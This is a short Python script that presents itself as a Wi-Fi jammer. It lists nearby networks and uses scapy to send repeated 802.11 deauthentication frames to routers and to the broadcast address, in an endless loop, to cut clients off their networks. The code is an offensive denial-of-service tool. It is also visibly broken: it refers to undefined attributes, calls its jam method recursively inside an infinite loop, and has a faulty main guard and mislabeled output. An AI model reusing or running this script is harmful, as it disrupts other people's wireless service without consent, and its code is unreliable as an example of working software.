# Jam wifi networks
# Author: astralm0nke on GitHub

from termcolor import colored
import wireless
from wifi import Cell
from scapy.all import *
# The 'wifi' python package enablers user to control their machine's wireless adapter
class WifiJammer:
    def __init__(self):
        self.wifi1 = wireless.Wireless()
        self.interface = self.wifi1.interface() 
        self.network_list = Cell.all(self.interface)
        self.bssids = []
        
    def __str__(self):
        print(self.wifi1, self.interface)

    def get_networks(self):
        for network in self.network_list:
            print(f'Network Name: {network.ssid}/n')
            print(f'Network Name: {network.bssid}/n')
            print(f'Network Name: {str(network.channel)}/n')
            print(f'Network Name: {str(network.quality)}n')
            print('\n')
    
    def jam(self, address):
        conf.iface = 'wlan1' #For sending ARP packets
        bssid = address #BSSID--> MAC Address for wireless router
        client_broadcast = 'FF:FF:FF:FF:FF:FF' #Broadcast jamming packet to all clients
        count = 4 #How many times we want to send packet to host
        conf.verb = 0 # Scapy variable, 
        packet = RadioTap()/Dot11(type=0, subtype=12, addr1=self.client, addr2=self.bssid, addr3=bssid)/Dot11Deauth(reason=7)
        for n in range(int(count)):
            send(packet)
            print(f'Deauth Num: {str(n)} sent via {conf.iface} to BSSID: {self.bssid} for client: {self.client}')
            
        while True: #Infinite loop
            for bssid in self.bssids:
                colored(print(f'Jamming on: {bssid}...'), 'green')
                self.jam(bssid)
                
                
if __name__ == 'main':
    jammer = WifiJammer()